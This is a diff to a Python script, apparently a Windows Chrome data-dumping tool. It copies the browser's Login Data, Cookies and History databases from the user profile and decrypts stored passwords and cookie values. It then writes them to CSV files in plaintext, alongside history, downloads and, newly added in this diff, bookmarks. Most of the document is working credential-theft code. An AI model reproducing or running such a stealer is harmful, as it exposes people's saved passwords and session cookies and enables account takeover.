@@ -2,6 +2,7 @@
 # v0.3
 
 import os
+import re
 import csv
 import time
 import json
@@ -67,36 +68,66 @@ def read_db(csv_path, csv_head, sql):
             data = []
             for r in cursor.fetchall():
                 for i in range(0, len(csv_head)):
-                    if type(r[i]) == type(114514) and r[i] > 10000000000000000:
+                    if isinstance(r[i], int) and r[i] > 10000000000000000:
                         data.append((timeStamp2time(r[i])))
-                    elif type(r[i]) == type(114514) and r[i] < 10000000000000000:
-                        data.append(r[i]/1024/1024)
-                    elif type(r[i]) == type(b"Aquilao"):
+                    elif isinstance(r[i], int) and r[i] < 10000000000000000:
+                        data.append(r[i]/1024)
+                    elif isinstance(r[i], bytes):
                         data.append(decrypt_value_all_version(r[i]))
                     else:
                         data.append(r[i])
                 csvwriter.writerow(data)
                 data = []
+            return 0
         except Exception as e:
-            print(e)
+            return 1
     cursor.close()
     conn.close()
-    try:
-        os.remove("temp")
-    except Exception as e:
-        pass
 
 def get_data(db_path, csv_path, csv_head, sql):
     target_db = os.environ['USERPROFILE'] + os.sep + db_path
     shutil.copy2(target_db, "temp")
     print("[+] Get Chrome Data From " + target_db)
-    read_db(csv_path, csv_head, sql)
-    print("[*] Output In " + os.getcwd() + "\\" + csv_path)
+    status = read_db(csv_path, csv_head, sql)
+    if status == 0:
+        print("[*] Output In " + os.getcwd() + "\\" + csv_path)
+    else:
+        print("[!] Error !")
+    try:
+        os.remove("temp")
+    except Exception as e:
+        pass
+
+def get_json_data(json_path, csv_path, csv_head):
+    target_json = os.environ['USERPROFILE'] + os.sep + json_path
+    # target_json = r"C:\Users\Aquilao\Desktop\Bookmarks"
+    shutil.copy2(target_json, "temp")
+    print("[+] Get Chrome Data From " + target_json)
+    with open(csv_path, 'w', newline = '', encoding = "utf-8-sig") as csv_file:
+        csvwriter = csv.writer(csv_file, dialect=("excel"))
+        csvwriter.writerow(csv_head)
+        with open("temp", 'r', encoding = "utf-8-sig") as f:
+            json_data = f.read()
+            data = []
+            match_date_added = re.findall("\"date_added\": \"(.*?)\",([\s\S]*?)\"guid\": \"", json_data, re.S)
+            match_name = re.findall("\"name\": \"(.*?)\",([\s\S]*?)\"type\": \"url\"", json_data, re.S)
+            match_url = re.findall("\"url\": \"(.*?)\"", json_data, re.S)
+            for i in range(0, len(match_url)):
+                data.append(match_name[i][0])
+                data.append(match_url[i])
+                data.append(timeStamp2time(int(match_date_added[i][0])))
+                csvwriter.writerow(data)
+                data = []
+    try:
+        os.remove("temp")
+    except Exception as e:
+        pass
+        
 
 def main():
     # Target File Path
     TARGET_FILE_PATH = {
-        "CHROME_PASSWORDS_DB_PATH"    : r"AppData\Local\Google\Chrome\User Data\Default\Login Data",
+        "CHROME_PASSWORDS_DB_PATH"   : r"AppData\Local\Google\Chrome\User Data\Default\Login Data",
         "CHROME_COOKIES_DB_PATH"     : r"AppData\Local\Google\Chrome\User Data\Default\Cookies",
         "CHROME_HISTORY_DB_PATH"     : r"AppData\Local\Google\Chrome\User Data\Default\History",
         "CHROME_BOOKMARKS_FILE_PATH" : r"AppData\Local\Google\Chrome\User Data\Default\Bookmarks"
@@ -106,22 +137,23 @@ def main():
         "CHROME_PASSWORD_CSV_PATH"  : "Chrome_password.csv",
         "CHROME_COOKIES_CSV_PATH"   : "Chrome_cookies.csv",
         "CHROME_HISTORY_CSV_PATH"   : "Chrome_history.csv",
-        "CHROME_BOOKMARKS_CSV_PATH" : "Chrome_bookmarks.csv",
-        "CHROME_DOWNLOADS_CSV_PATH" : "Chrome_downloads.csv"
+        "CHROME_DOWNLOADS_CSV_PATH" : "Chrome_downloads.csv",
+        "CHROME_BOOKMARKS_CSV_PATH" : "Chrome_bookmarks.csv"
     }
     # Csv File Head
     CSV_FILE_HEAD = {
         "PASSOWRDS_CSV_HEAD" : ["url", "username", "password"],
         "COOKIES_CSV_HEAD"   : ["domain", "name", "cookies"],
         "HISTORY_CSV_HEAD"   : ["url", "title", "visit count", "last visit time"],
-        "DOWNLOADS_CSV_HEAD" : ["target path", "url", "size(MB)", "start time", "end time"]
+        "DOWNLOADS_CSV_HEAD" : ["target path", "url", "size(KB)", "start time", "end time"],
+        "BOOKMARKS_CSV_HEAD" : ["site name", "url", "create time"]
     }
     # Sql
     SQL = {
         "LOGIN_DATA_SQL" : "SELECT origin_url, username_value, password_value FROM logins;",
         "COOKIES_SQL"    : "SELECT host_key, name, encrypted_value FROM cookies;",
         "HISTORY_SQL"    : "SELECT url, title, visit_count, last_visit_time FROM urls;",
-        "DOWNLOADS_SQL"   : "SELECT target_path, tab_url, total_bytes, start_time, end_time FROM downloads;"
+        "DOWNLOADS_SQL"  : "SELECT target_path, tab_url, total_bytes, start_time, end_time FROM downloads;"
     }
     # Get Chrome Password
     get_data(TARGET_FILE_PATH["CHROME_PASSWORDS_DB_PATH"], RESULT_FILE_PATH["CHROME_PASSWORD_CSV_PATH"], CSV_FILE_HEAD["PASSOWRDS_CSV_HEAD"], SQL["LOGIN_DATA_SQL"])
@@ -131,7 +163,8 @@ def main():
     get_data(TARGET_FILE_PATH["CHROME_HISTORY_DB_PATH"], RESULT_FILE_PATH["CHROME_HISTORY_CSV_PATH"], CSV_FILE_HEAD["HISTORY_CSV_HEAD"], SQL["HISTORY_SQL"])
     # Get Download History
     get_data(TARGET_FILE_PATH["CHROME_HISTORY_DB_PATH"], RESULT_FILE_PATH["CHROME_DOWNLOADS_CSV_PATH"], CSV_FILE_HEAD["DOWNLOADS_CSV_HEAD"], SQL["DOWNLOADS_SQL"])
-
+    # Get Bookmarks
+    get_json_data(TARGET_FILE_PATH["CHROME_BOOKMARKS_FILE_PATH"], RESULT_FILE_PATH["CHROME_BOOKMARKS_CSV_PATH"], CSV_FILE_HEAD["BOOKMARKS_CSV_HEAD"])
 
 
 if __name__ == '__main__':
